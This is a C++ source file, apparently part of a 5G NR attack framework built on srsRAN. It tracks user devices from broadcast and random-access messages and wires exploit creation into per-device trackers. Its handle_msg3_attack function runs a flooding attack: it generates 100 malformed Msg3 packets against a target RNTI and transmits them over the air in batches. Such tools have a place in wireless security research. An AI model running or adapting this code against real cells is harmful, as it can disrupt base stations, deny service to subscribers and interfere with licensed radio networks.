#include "shadower/comp/scheduler.h"

Scheduler::Scheduler(ShadowerConfig& config_, Source* source_, Syncer* syncer_, create_exploit_t create_exploit_) :
  config(config_), source(source_), syncer(syncer_), create_exploit(create_exploit_), srsran::thread("Scheduler")
{
  /* Initialize phy config */
  init_phy_cfg(phy_cfg, config);
  /* Initialize broadcast worker for SIB worker */
  broadcast_worker = std::make_shared<BroadCastWorker>(config);
  /* Attach the handler to create new UE tracker when new RACH msg2 is found */
  broadcast_worker->on_ue_found = std::bind(&Scheduler::handle_new_ue_found,
                                            this,
                                            std::placeholders::_1,
                                            std::placeholders::_2,
                                            std::placeholders::_3,
                                            std::placeholders::_4);
  /* Attach the handler to apply the configuration from SIB1 */
  broadcast_worker->on_sib1_found = std::bind(&Scheduler::handle_sib1, this, std::placeholders::_1);
  /* Attach the handler for msg3 attack */
  broadcast_worker->on_msg3_attack = std::bind(&Scheduler::handle_msg3_attack,
                                               this,
                                               std::placeholders::_1,
                                               std::placeholders::_2,
                                               std::placeholders::_3);
  broadcast_workers.push_back(broadcast_worker);
  
  /* Initialize msg3 generator */
  msg3_generator = std::make_unique<Msg3Generator>(config);
  
  /* Initialize msg3 uplink workers */
  for (uint32_t i = 0; i < 2; i++) { // Create 2 msg3 ul workers
    auto worker = std::make_unique<Msg3ULWorker>(logger, source, config);
    if (!worker->init()) {
      logger.error("Failed to initialize msg3 UL worker %u", i);
      continue;
    }
    msg3_ul_workers.push_back(std::move(worker));
  }

  /* bind the cell found handler to broadcast worker, when cell is found, apply the configuration to broadcast worker */
  syncer->on_cell_found = std::bind(&Scheduler::handle_mib, this, std::placeholders::_1, std::placeholders::_2);
  /* bind the new task handler of the syncer */
  syncer->publish_subframe = std::bind(&Scheduler::push_new_task, this, std::placeholders::_1);
  /* bind the syncer error handler */
  syncer->error_handler = std::bind(&Scheduler::syncer_exit_handler, this);

  /* Initialize wdissector */
  wd_worker = new WDWorker(config.duplex_mode, config.worker_log_level);
  /* initialize thread pool */
  thread_pool = new ThreadPool(config.pool_size);
  /* Initialize a list of UE trackers before start */
  pre_initialize_ue();
}

/* Initialize a list of UE trackers before start */
void Scheduler::pre_initialize_ue()
{
  for (uint32_t i = 0; i < config.num_ues; i++) {
    /* Create new UE tracker */
    std::shared_ptr<UETracker> ue = std::make_shared<UETracker>(source, syncer, wd_worker, config, create_exploit);
    /* Call the init function */
    if (!ue->init()) {
      logger.error("Failed to initialize UE tracker");
      continue;
    }
    ue->on_deactivate = std::bind(&Scheduler::on_ue_deactivate, this);
    ue_trackers.push_back(ue);
  }
}

/* handler to handle syncer error event */
void Scheduler::syncer_exit_handler()
{
  std::this_thread::sleep_for(std::chrono::seconds(5));
  logger.error(RED "Syncer error event" RESET);
  running.store(false);
  thread_cancel();
}

/* handler to handle new task from syncer */
void Scheduler::push_new_task(std::shared_ptr<Task>& task)
{
  task_queue.push(task);
}

/* handler to activate new UE tracker when new RACH msg2 is found */
void Scheduler::handle_new_ue_found(uint16_t                   rnti,
                                    std::array<uint8_t, 27UL>& grant,
                                    uint32_t                   current_slot,
                                    uint32_t                   time_advance)
{
  std::shared_ptr<UETracker> selected_ue = nullptr;
  /* select a UE tracker that is not activated */
  for (uint32_t i = 0; i < config.num_ues; i++) {
    auto ue = ue_trackers[i];
    if (!ue->is_active()) {
      selected_ue = ue;
      break;
    }
  }
  if (!selected_ue) {
    logger.error(RED "No available UE tracker" RESET);
    return;
  }
  selected_ue->activate(rnti, srsran_rnti_type_c, time_advance);
  selected_ue->set_ue_rar_grant(grant, current_slot);
  syncer->tracer_status.send_string(fmt::format("{{\"UE\": {:d} }}", rnti), true);
}

void Scheduler::on_ue_deactivate()
{
  syncer->tracer_status.send_string("{\"UE\": false }", true);
}

/* handler to apply MIB configuration to multiple workers */
void Scheduler::handle_mib(srsran_mib_nr_t& mib_, uint32_t ncellid_)
{
  mib     = std::move(mib_);
  ncellid = ncellid_;
  broadcast_worker->apply_config_from_mib(mib, ncellid);
  for (const std::shared_ptr<UETracker>& ue : ue_trackers) {
    ue->apply_config_from_mib(mib, ncellid);
  }
  logger.info(CYAN "MIB applied to all workers" RESET);
}

/* handler to apply sib1 configuration to multiple workers */
void Scheduler::handle_sib1(asn1::rrc_nr::sib1_s& sib1_)
{
  sib1 = std::move(sib1_);
  broadcast_worker->apply_config_from_sib1(sib1);
  for (const std::shared_ptr<UETracker>& ue : ue_trackers) {
    ue->apply_config_from_sib1(sib1);
  }
  logger.info(CYAN "SIB1 applied to all workers" RESET);

  // Update cell status
  asn1::rrc_nr::plmn_id_info_s& plmn = sib1.cell_access_related_info.plmn_id_list[0];
  asn1::rrc_nr::mcc_l&          mcc  = plmn.plmn_id_list[0].mcc;
  asn1::rrc_nr::mnc_l&          mnc  = plmn.plmn_id_list[0].mnc;

  std::string mnc_str;
  if (mnc.size() == 2)
    mnc_str = fmt::format("{}{}", mnc[0], mnc[1]);
  else
    mnc_str = fmt::format("{}{}{}", mnc[0], mnc[1], mnc[2]);

  syncer->tracer_status.send_string(fmt::format("{{\"CELL\": {}, \"TAC\": {}, \"MCC\": \"{}{}{}\", \"MNC\": \"{}\" }}",
                                                syncer->ncellid,
                                                plmn.tac.to_number(),
                                                mcc[0],
                                                mcc[1],
                                                mcc[2],
                                                mnc_str),
                                    true);

  /* Track each RA-RNTI with an Broadcast Worker */
  std::vector<uint16_t> ra_rnti_list = get_ra_rnti_list(sib1, config);
  for (uint32_t ra_rnti_idx = 0; ra_rnti_idx < ra_rnti_list.size(); ra_rnti_idx++) {
    std::shared_ptr<BroadCastWorker> bc_worker = nullptr;
    if (ra_rnti_idx > 0) {
      bc_worker = std::make_shared<BroadCastWorker>(config);
      bc_worker->apply_config_from_mib(mib, ncellid);
      bc_worker->apply_config_from_sib1(sib1);
      bc_worker->on_ue_found = std::bind(&Scheduler::handle_new_ue_found,
                                         this,
                                         std::placeholders::_1,
                                         std::placeholders::_2,
                                         std::placeholders::_3,
                                         std::placeholders::_4);
      broadcast_workers.push_back(bc_worker);
    } else {
      bc_worker = broadcast_worker;
    }
    uint16_t ra_rnti = ra_rnti_list[ra_rnti_idx];
    bc_worker->set_rnti(ra_rnti, srsran_rnti_type_ra);
    logger.info("Activating Broadcast Worker for RA-RNTI[%u]: %u", ra_rnti_idx, ra_rnti);
  }
}

/* handler for msg3 flooding attack */
void Scheduler::handle_msg3_attack(uint16_t rnti, std::array<uint8_t, 27UL>& grant, uint32_t slot_idx)
{
  logger.warning(YELLOW "*** MSG3 FLOODING ATTACK INITIATED ***" RESET);
  logger.info("Target RNTI: 0x%x, Slot: %u", rnti, slot_idx);
  
  // Generate 100 malformed msg3 packets (10 different types, 10 of each)
  uint32_t total_packets = 100;
  uint32_t num_unique = 10; // Generate 10 unique malformed msg3s
  
  for (uint32_t batch = 0; batch < (total_packets / num_unique); batch++) {
    if (!msg3_generator->generate_msg3_packets(rnti, grant, slot_idx, num_unique)) {
      logger.error("Failed to generate msg3 packets");
      return;
    }
    
    // Transmit all packets in the queue
    uint32_t pkt_count = 0;
    while (msg3_generator->has_msg3_packets()) {
      auto msg3_pdu = msg3_generator->get_next_msg3();
      if (!msg3_pdu) {
        break;
      }
      
      // Create task for msg3 transmission
      Msg3ULWorker::msg3_ul_task_t task = {};
      task.rnti                         = msg3_generator->get_rnti();
      task.rnti_type                    = srsran_rnti_type_ra;
      task.slot_idx                     = msg3_generator->get_target_slot_idx() + pkt_count; // Spread packets
      task.rx_tti                       = slot_idx;
      task.msg3_pdu                     = std::move(msg3_pdu);
      task.dci_msg                      = msg3_generator->get_grant_info();
      
      // Get timestamp from syncer
      srsran_timestamp_t rx_time;
      uint32_t           current_slot;
      syncer->get_tti(&current_slot, &rx_time);
      task.rx_time = rx_time;
      
      // Select a msg3 ul worker and submit task
      uint32_t worker_idx = pkt_count % msg3_ul_workers.size();
      if (worker_idx < msg3_ul_workers.size()) {
        msg3_ul_workers[worker_idx]->set_context(task);
        // Trigger transmission
        thread_pool->enqueue([this, worker_idx]() {
          if (worker_idx < msg3_ul_workers.size()) {
            msg3_ul_workers[worker_idx]->execute_work();
          }
        });
      }
      
      pkt_count++;
    }
    
    logger.info("Batch %u: Transmitted %u msg3 packets", batch + 1, pkt_count);
  }
  
  logger.warning(GREEN "*** MSG3 FLOODING ATTACK COMPLETED: %u packets sent ***" RESET, total_packets);
}

void Scheduler::run_thread()
{
  while (running) {
    std::shared_ptr<Task> task = task_queue.retrieve();
    if (!task) {
      continue;
    }
    /* Run the task on all active ue trackers */
    for (const std::shared_ptr<UETracker>& ue : ue_trackers) {
      if (!ue->is_active()) {
        continue;
      }
      ue->work_on_task(task);
    }
    /* Run the task on the broadcast worker */
    for (const std::shared_ptr<BroadCastWorker>& bc_worker : broadcast_workers) {
      thread_pool->enqueue([bc_worker, task]() { bc_worker->work(task); });
    }
  }
}